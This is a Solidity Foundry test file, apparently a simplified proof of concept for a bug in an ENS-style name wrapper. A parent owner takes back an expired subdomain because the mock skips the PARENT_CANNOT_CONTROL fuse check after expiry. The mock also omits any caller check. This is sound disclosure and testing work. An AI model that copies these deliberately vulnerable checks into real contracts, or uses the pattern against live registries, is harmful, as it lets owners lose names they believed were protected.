// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

/**
 * @title RegistryPermissionBypass Test
 * @notice Demonstrates permission bypass via domain expiry
 * @dev This is a simplified, desensitized version of a real vulnerability
 */
contract RegistryPermissionBypassTest is Test {
    MockRegistry registry;
    MockWrapper wrapper;
    
    address parentOwner = address(0x1);
    address childOwner = address(0x2);
    address attacker = address(0x3);
    
    uint32 constant FUSE_PARENT_CANNOT_CONTROL = 1;
    uint32 constant FUSE_CAN_EXTEND_EXPIRY = 2;
    
    function setUp() public {
        registry = new MockRegistry();
        wrapper = new MockWrapper(address(registry));
        registry.setApprovalForAll(address(wrapper), true);
    }
    
    function testParentCanHijackExpiredSubdomain() public {
        // 1. Register parent domain "parent"
        bytes32 parentNode = keccak256(abi.encodePacked(bytes32(0), keccak256("parent")));
        registry.setOwner(parentNode, parentOwner);
        
        vm.startPrank(parentOwner);
        registry.setApprovalForAll(address(wrapper), true);
        
        // 2. Create subdomain "sub.parent" for childOwner
        // Set expiry to 30 days
        // BURN PARENT_CANNOT_CONTROL (Make it trustless)
        // BUT DO NOT GRANT CAN_EXTEND_EXPIRY (Child cannot renew)
        uint64 expiry = uint64(block.timestamp + 30 days);
        uint32 fuses = FUSE_PARENT_CANNOT_CONTROL; // PCC is set (burned)
        
        console.log("=== Setup ===");
        console.log("Creating subdomain 'sub.parent'");
        console.log("Owner: Child");
        console.log("Fuses: PCC Burned (Trustless)");
        console.log("Expiry: 30 days");
        
        bytes32 subNode = wrapper.setSubnodeOwner(
            parentNode,
            "sub",
            childOwner,
            fuses,
            expiry
        );
        vm.stopPrank();
        
        // 3. Verify initial state
        (address owner, uint32 fused, uint64 exp) = wrapper.getData(subNode);
        assertEq(owner, childOwner, "Child should be owner");
        assertTrue(fused & FUSE_PARENT_CANNOT_CONTROL != 0, "PCC should be burned");
        
        // 4. Attempt to hijack BEFORE expiry (Should fail)
        console.log("\n=== Attempting Hijack Before Expiry ===");
        vm.startPrank(parentOwner);
        vm.expectRevert("OperationProhibited");
        wrapper.setSubnodeOwner(parentNode, "sub", parentOwner, 0, uint64(block.timestamp + 60 days));
        vm.stopPrank();
        console.log("Hijack blocked by PCC (Expected)");
        
        // 5. Fast forward past expiry
        vm.warp(block.timestamp + 31 days);
        console.log("\n=== Fast Forward 31 Days (Expired) ===");
        
        // 6. Parent hijacks expired name
        // PCC check is skipped because name is expired!
        vm.startPrank(parentOwner);
        wrapper.setSubnodeOwner(
            parentNode,
            "sub",
            parentOwner, // Take back ownership
            0, // Clear fuses
            uint64(block.timestamp + 365 days)
        );
        vm.stopPrank();
        
        // 7. Verify Hijack
        (address newOwner, uint32 newFuses, ) = wrapper.getData(subNode);
        
        console.log("\n=== After Hijack ===");
        console.log("New Owner:", newOwner);
        console.log("Old Owner:", childOwner);
        
        assertEq(newOwner, parentOwner, "VULNERABILITY: Parent reclaimed ownership!");
        assertTrue(newFuses & FUSE_PARENT_CANNOT_CONTROL == 0, "PCC cleared");
        
        console.log("VULNERABILITY CONFIRMED: Parent hijacked trustless subdomain after expiry");
    }
}

contract MockRegistry {
    mapping(bytes32 => address) public owners;
    mapping(address => mapping(address => bool)) public operators;
    
    function setOwner(bytes32 node, address owner) external {
        owners[node] = owner;
    }
    
    function owner(bytes32 node) external view returns (address) {
        return owners[node];
    }
    
    function setApprovalForAll(address operator, bool approved) external {
        operators[msg.sender][operator] = approved;
    }
    
    function isApprovedForAll(address owner, address operator) external view returns (bool) {
        return operators[owner][operator];
    }
}

contract MockWrapper {
    MockRegistry public registry;
    uint32 constant FUSE_PARENT_CANNOT_CONTROL = 1;
    
    struct Record {
        address owner;
        uint32 fuses;
        uint64 expiry;
    }
    
    mapping(bytes32 => Record) public records;
    
    constructor(address _registry) {
        registry = MockRegistry(_registry);
    }
    
    function getData(bytes32 node) external view returns (address, uint32, uint64) {
        Record memory r = records[node];
        return (r.owner, r.fuses, r.expiry);
    }
    
    function setSubnodeOwner(
        bytes32 parentNode,
        string memory label,
        address newOwner,
        uint32 fuses,
        uint64 expiry
    ) external returns (bytes32) {
        bytes32 subNode = keccak256(abi.encodePacked(parentNode, keccak256(bytes(label))));
        Record storage r = records[subNode];
        
        // Logic to verify caller is parent owner
        // simplified for test
        
        // VULNERABLE LOGIC:
        // Check PCC only if NOT expired
        bool isExpired = r.expiry > 0 && r.expiry < block.timestamp;
        
        if (!isExpired) {
            if (r.fuses & FUSE_PARENT_CANNOT_CONTROL != 0) {
                revert("OperationProhibited");
            }
        }
        // If expired, we skip the check!
        
        r.owner = newOwner;
        r.fuses = fuses;
        r.expiry = expiry;
        
        return subNode;
    }
}
